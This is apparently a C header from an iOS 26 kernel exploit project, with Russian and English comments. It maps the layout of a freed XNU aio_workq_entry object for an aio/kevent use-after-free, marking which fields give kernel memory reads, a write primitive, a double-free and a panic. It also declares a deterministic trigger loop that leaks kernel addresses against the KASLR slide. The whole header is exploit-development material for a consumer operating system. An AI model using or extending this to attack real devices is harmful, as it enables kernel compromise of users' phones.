// language: C, file: aio_kevent_rw.h, target: iOS 26.0-26.2 arm64e, Theos
// Track B — aio kevent UAF: детерминированный триггер + kevent-разведка.
//
// B0-карта объекта (aio_workq_entry, zone aio_workq_zonep ~224B, zeroed
// on free, лимит 8 на процесс). Смещения — из XNU-сурса, сверены с
// runtime donor'а на 26.2; в коде числами не используются (C-struct).
//
//   +0x00 aio_workq_link   (next/prev)  plain  workq link
//   +0x10 aio_proc_link    (next/prev)  plain  WRITE: *prev = next (TAILQ_REMOVE)
//   +0x20 returnval        i64          plain  READ: kev.ext[1] (= nbytes)
//   +0x28 errorval         i32          plain  READ: kev.ext[0]
//   +0x2C aio_refcount     u32          plain  aio_entry_unref -> double-free
//   +0x30 flags            u32          plain  AIO_COMPLETED (0x100) гейт
//   +0x34 lio_pending      i32          plain
//   +0x38 lio_leader       ptr          plain
//   +0x40 procp            struct proc* plain  aio_proc_lock(*(v)); 0 -> PANIC FAR=0x58
//   +0x48 uaiocbp          user ptr     plain  -> kev.ident
//   +0x50 aiocb (user_aiocb)            plain  sigev_signo=kqfd, sival_ptr -> kev.udata
//   ...   context / aio_map                     plain
//
// knote-сторона: kn_hook = raw dangling ptr (кноп без ref, без PAC).
// filt_aioprocess: ext0=+0x28, ext1=+0x20, data=0, then TAILQ_REMOVE(+0x10/+0x18),
// unref(+0x2C), aio_proc_lock(*(+0x40)). Signed fn-ptr на путях данных нет.

#ifndef NK_AIO_KEVENT_RW_H
#define NK_AIO_KEVENT_RW_H

#include <stdint.h>
#include <stdbool.h>

typedef struct {
    int      attempts;      /* сколько попыток сыграно            */
    int      hits;          /* kevent доставлен на reclaimed entry */
    int      silent;        /* событие потеряно (race не собралась)*/
    int      panics;        /* ребутов за цикл (считает штурман)  */
    uint64_t last_ext0;
    uint64_t last_ext1;
    uint64_t last_ident;
    uint64_t last_udata;
    uint64_t last_fflags;
} nk_aio_stat_t;

/* B1+B2: цикл из `attempts` попыток детерминированного триггера
 * (LIFO-reclaim, один CPU). Каждая попытка: hex-дамп всех полей kevent,
 * фильтр ядровых VA, сверка с g_nk.slide.
 * Возврат: 0 если hits > 0, -1 иначе. stat_out: opt. */
int nk_aio_uaf_b12(int attempts, nk_aio_stat_t *stat_out);

#endif
